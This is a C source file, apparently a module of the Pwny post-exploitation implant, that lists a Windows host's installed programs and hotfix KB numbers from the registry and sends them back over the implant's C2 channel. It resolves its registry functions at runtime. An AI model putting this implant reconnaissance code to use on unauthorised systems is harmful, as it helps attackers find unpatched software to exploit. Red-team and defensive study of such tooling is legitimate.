/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * System info COT plugin — enumerate installed software and hotfixes
 * via registry.  Merged from installed_apps + hotfix.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Tags                                                                */
/* ------------------------------------------------------------------ */

#define SYSINFO_APPS \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define SYSINFO_HOTFIX \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

/* TLV types — installed apps */
#define TLV_TYPE_APP_NAME    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_APP_VERSION TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_APP_VENDOR  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_APP_DATE    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_APP_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP,  TAB_BASE, API_TYPE)

/* TLV types — hotfix (reuse same base offsets — separate response packets) */
#define TLV_TYPE_HF_KBID    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_HF_DESC    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_HF_DATE    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_HF_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP,  TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef LONG (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD,
                                         LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD,
                                            LPBYTE, LPDWORD);
typedef LONG (WINAPI *fn_RegCloseKey)(HKEY);

static struct
{
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegCloseKey       pRegCloseKey;
} w;

/* ================================================================== */
/* Installed apps                                                      */
/* ================================================================== */

static int reg_read_string(HKEY hKey, const char *name,
                           char *buf, DWORD bufsz)
{
    DWORD type = 0;
    DWORD size = bufsz;
    LONG ret;

    ret = w.pRegQueryValueExA(hKey, name, NULL, &type, (LPBYTE)buf, &size);
    if (ret != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ))
    {
        buf[0] = '\0';
        return -1;
    }
    buf[size < bufsz ? size : bufsz - 1] = '\0';
    return 0;
}

static void enum_uninstall_key(HKEY hRoot, const char *path,
                               c2_t *c2, tlv_pkt_t *result)
{
    HKEY hKey;
    LONG ret;
    DWORD index;
    char subkey_name[256];
    DWORD name_len;

    ret = w.pRegOpenKeyExA(hRoot, path, 0, KEY_READ, &hKey);
    if (ret != ERROR_SUCCESS)
        return;

    for (index = 0; ; index++)
    {
        HKEY hSubKey;
        char display_name[512];
        char version[128];
        char publisher[256];
        char install_date[64];
        char full_path[512];
        tlv_pkt_t *entry;
        int i;

        name_len = sizeof(subkey_name);
        ret = w.pRegEnumKeyExA(hKey, index, subkey_name, &name_len,
                                NULL, NULL, NULL, NULL);
        if (ret != ERROR_SUCCESS)
            break;

        i = 0;
        {
            const char *p = path;
            while (*p && i < 500) full_path[i++] = *p++;
            full_path[i++] = '\\';
            p = subkey_name;
            while (*p && i < 510) full_path[i++] = *p++;
            full_path[i] = '\0';
        }

        ret = w.pRegOpenKeyExA(hRoot, full_path, 0, KEY_READ, &hSubKey);
        if (ret != ERROR_SUCCESS)
            continue;

        reg_read_string(hSubKey, "DisplayName", display_name,
                        sizeof(display_name));
        reg_read_string(hSubKey, "DisplayVersion", version,
                        sizeof(version));
        reg_read_string(hSubKey, "Publisher", publisher,
                        sizeof(publisher));
        reg_read_string(hSubKey, "InstallDate", install_date,
                        sizeof(install_date));

        w.pRegCloseKey(hSubKey);

        if (display_name[0] == '\0')
            continue;

        entry = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_string(entry, TLV_TYPE_APP_NAME, display_name);
        tlv_pkt_add_string(entry, TLV_TYPE_APP_VERSION,
                           version[0] ? version : "");
        tlv_pkt_add_string(entry, TLV_TYPE_APP_VENDOR,
                           publisher[0] ? publisher : "");
        tlv_pkt_add_string(entry, TLV_TYPE_APP_DATE,
                           install_date[0] ? install_date : "");
        tlv_pkt_add_tlv(result, TLV_TYPE_APP_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    w.pRegCloseKey(hKey);
}

static tlv_pkt_t *sysinfo_apps(c2_t *c2)
{
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    enum_uninstall_key(
        (HKEY)(ULONG_PTR)0x80000002,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        c2, result);

    enum_uninstall_key(
        (HKEY)(ULONG_PTR)0x80000002,
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        c2, result);

    enum_uninstall_key(
        (HKEY)(ULONG_PTR)0x80000001,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        c2, result);

    return result;
}

/* ================================================================== */
/* Hotfix                                                              */
/* ================================================================== */

static int extract_kb(const char *name, char *kb_out, int kb_sz)
{
    const char *p = name;

    while (*p)
    {
        if ((p[0] == 'K' || p[0] == 'k') &&
            (p[1] == 'B' || p[1] == 'b') &&
            p[2] >= '0' && p[2] <= '9')
        {
            int i = 0;
            kb_out[i++] = 'K';
            kb_out[i++] = 'B';
            p += 2;
            while (*p >= '0' && *p <= '9' && i < kb_sz - 1)
                kb_out[i++] = *p++;
            kb_out[i] = '\0';
            return 0;
        }
        p++;
    }
    return -1;
}

static tlv_pkt_t *sysinfo_hotfix(c2_t *c2)
{
    HKEY hKey;
    LONG ret;
    DWORD index;
    char subkey_name[512];
    DWORD name_len;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    ret = w.pRegOpenKeyExA(
        (HKEY)(ULONG_PTR)0x80000002,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
        "Component Based Servicing\\Packages",
        0, KEY_READ, &hKey);

    if (ret == ERROR_SUCCESS)
    {
        for (index = 0; ; index++)
        {
            char kb[32];
            tlv_pkt_t *entry;

            name_len = sizeof(subkey_name);
            ret = w.pRegEnumKeyExA(hKey, index, subkey_name, &name_len,
                                    NULL, NULL, NULL, NULL);
            if (ret != ERROR_SUCCESS)
                break;

            if (extract_kb(subkey_name, kb, sizeof(kb)) != 0)
                continue;

            entry = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
            tlv_pkt_add_string(entry, TLV_TYPE_HF_KBID, kb);
            tlv_pkt_add_string(entry, TLV_TYPE_HF_DESC, subkey_name);
            tlv_pkt_add_string(entry, TLV_TYPE_HF_DATE, "");
            tlv_pkt_add_tlv(result, TLV_TYPE_HF_GROUP, entry);
            tlv_pkt_destroy(entry);
        }

        w.pRegCloseKey(hKey);
    }

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pRegOpenKeyExA    = (fn_RegOpenKeyExA)cot_resolve("advapi32.dll",
                                                         "RegOpenKeyExA");
    w.pRegEnumKeyExA    = (fn_RegEnumKeyExA)cot_resolve("advapi32.dll",
                                                         "RegEnumKeyExA");
    w.pRegQueryValueExA = (fn_RegQueryValueExA)cot_resolve("advapi32.dll",
                                                            "RegQueryValueExA");
    w.pRegCloseKey      = (fn_RegCloseKey)cot_resolve("advapi32.dll",
                                                       "RegCloseKey");

    api_call_register(api_calls, SYSINFO_APPS,   (api_t)sysinfo_apps);
    api_call_register(api_calls, SYSINFO_HOTFIX, (api_t)sysinfo_hotfix);
}

#endif
